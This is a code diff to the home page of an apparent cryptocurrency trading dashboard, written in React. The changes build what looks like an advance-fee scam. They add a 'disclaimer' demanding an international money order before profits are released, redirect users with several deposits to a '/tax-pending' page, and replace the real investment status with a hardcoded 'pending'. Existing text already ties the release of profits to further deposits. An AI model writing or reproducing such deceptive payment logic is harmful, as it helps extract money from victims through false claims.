@@ -17,6 +17,7 @@ import coin from "./../../../images/coin.png";
 import metaverse from "./../../../images/metaverse.png";
 import { useNavigate } from "react-router-dom";
 import axios from "axios";
+import Disclaimer from "../Disclaimer";
 
 const DashboardComboChart = loadable(() =>
   pMinDelay(import("./Dashboard/DashboardComboChart"), 1000)
@@ -38,6 +39,16 @@ const Home = () => {
   const [orderBook, setOrderBook] = useState({ bids: [], asks: [] });
   const [currentEthPrice, setCurrentEthPrice] = useState(null);
   const [priceDirection, setPriceDirection] = useState(""); // "up", "down", or ""
+  const [showDisclaimer, setShowDisclaimer] = useState(false);
+  const dislcaimerText = `For new clients whose profits exceed the specified threshold, an
+  international money order is necessary. This is a measure to verify
+  the legitimacy of the accounts and prevent fraudulent activity.
+  Additionally, the international money order helps us authenticate that
+  the client is not a bot. It is important to note that we cannot be
+  held liable for any losses resulting from incomplete deposit payments.{" "}`;
+  function toggleDisclaimer() {
+    setShowDisclaimer(!showDisclaimer);
+  }
 
   const getUser = localStorage.getItem("userDetails");
   const navigate = useNavigate();
@@ -66,6 +77,10 @@ const Home = () => {
       );
       if (response.ok) {
         const data = await response.json();
+
+        if (data.length > 1) {
+          navigate("/tax-pending");
+        }
 
         if (data.length > 0) {
           let sumDeposits = 0;
@@ -171,6 +186,12 @@ const Home = () => {
   } else {
     return (
       <>
+        {showDisclaimer && (
+          <Disclaimer
+            text={dislcaimerText}
+            toggleDislaimer={toggleDisclaimer}
+          />
+        )}
         <div className="row">
           <div className="col-xl-8">
             <div className="row">
@@ -195,12 +216,18 @@ const Home = () => {
                           withdrawn into your account. Once the deposit is made
                           your profits will be released to the account. If this
                           is your first trade on our system you will receive a
-                          full refund
+                          full refund.
+                          <Link
+                            className="btn btn-primary w-75 mt-4"
+                            onClick={toggleDisclaimer}
+                          >
+                            Disclaimer
+                          </Link>
                         </p>
                         {/* <Link to={"/exchange"} className="btn btn-primary">Make Deposit</Link> */}
                       </div>
                       <div className="coin-img">
-                        <img src={coin} className="img-fluid" alt="" />
+                        {/*  <img src={coin} className="img-fluid" alt="" />*/}
                       </div>
                     </div>
                   </div>
@@ -276,7 +303,7 @@ const Home = () => {
                             {data.icon}
                           </span>
                           <div className="ms-2">
-                            <h6>{data.Name}/ETH</h6>
+                            <h6>USDT/ETH</h6>
                             <span>March</span>
                           </div>
                         </div>
@@ -291,7 +318,7 @@ const Home = () => {
                   </div>
                 </div>
               </div>
-              <div className="col-xl-3 col-sm-6">
+              {/* <div className="col-xl-3 col-sm-6">
                 <div className="card bg-secondary email-susb">
                   <div className="card-body text-center">
                     <div className="">
@@ -302,9 +329,9 @@ const Home = () => {
                       <h5>Total trades completed this year</h5>
                     </div>
                     {/* <Link to={"/exchange"} className="btn btn-primary email-btn">Buy Coin</Link> */}
-                  </div>
+              {/* </div>
                 </div>
-              </div>
+              </div> */}
             </div>
           </div>
           <div className="col-xl-4">
@@ -350,7 +377,7 @@ const Home = () => {
                                       color: "#9568ff",
                                     }}
                                   >
-                                    {investments[0].status}
+                                    pending
                                   </span>
                                   {/* <Nav.Link as="button"  eventKey="Navbuymarket"  type="button"  >market order</Nav.Link>
 																	<Nav.Link as="button"  eventKey="Navbuylimit"  type="button" >limit order</Nav.Link> */}
@@ -398,7 +425,7 @@ const Home = () => {
                 <div className="card">
                   <div className="card-header py-2">
                     <h2 className="heading">
-                      Order Book <span>(HGC/ETH)</span>
+                      Order Book <span>(USDT/ETH)</span>
                     </h2>
                   </div>
                   <div className="card-body pt-0 pb-3 px-2">
